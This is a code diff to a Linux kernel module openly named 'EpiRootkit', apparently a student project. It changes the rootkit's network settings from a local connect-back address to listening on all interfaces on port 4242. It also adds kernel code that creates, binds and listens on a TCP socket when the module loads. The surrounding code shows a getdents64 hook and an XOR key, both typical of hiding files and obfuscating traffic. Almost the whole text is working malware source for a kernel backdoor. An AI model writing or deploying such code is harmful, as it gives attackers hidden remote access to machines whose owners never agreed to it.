@@ -32,8 +32,8 @@ MODULE_VERSION("0.1");
 
 // Global variables
 struct rootkit_config config = {
-    .port = 4444,
-    .server_ip = "127.0.0.1",
+    .port = 4242,
+    .server_ip = "0.0.0.0",
     .buffer_size = 4096,
     .xor_key = "epita",
     .temp_output_file = "/tmp/rootkit_output",
@@ -232,6 +232,40 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
     return ret;
 }
 
+static int listen_for_connections(void) {
+    struct sockaddr_in addr;
+    int ret;
+
+    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
+                          &g_connection_socket);
+    if (ret < 0) {
+        printk(KERN_ERR "EpiRootkit: Failed to create socket\n");
+        return ret;
+    }
+
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(config.port);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    ret = g_connection_socket->ops->bind(g_connection_socket,
+                                        (struct sockaddr *)&addr,
+                                        sizeof(addr));
+    if (ret < 0) {
+        printk(KERN_ERR "EpiRootkit: Failed to bind socket\n");
+        return ret;
+    }
+
+    ret = g_connection_socket->ops->listen(g_connection_socket, 1);
+    if (ret < 0) {
+        printk(KERN_ERR "EpiRootkit: Failed to listen on socket\n");
+        return ret;
+    }
+
+    printk(KERN_INFO "EpiRootkit: Listening on port %d\n", config.port);
+    return 0;
+}
+
 // Module initialization
 static int __init epirootkit_init(void) {
     printk(KERN_INFO "EpiRootkit: Initializing...\n");
@@ -249,7 +283,13 @@ static int __init epirootkit_init(void) {
         printk(KERN_ERR "EpiRootkit: Failed to allocate non-paged memory\n");
         return -ENOMEM;
     }
-    
+
+    // Start listening for connections
+    if (listen_for_connections() < 0) {
+        printk(KERN_ERR "EpiRootkit: Failed to start listening\n");
+        return -EINVAL;
+    }
+
     printk(KERN_INFO "EpiRootkit: Initialized successfully\n");
     return 0;
 }
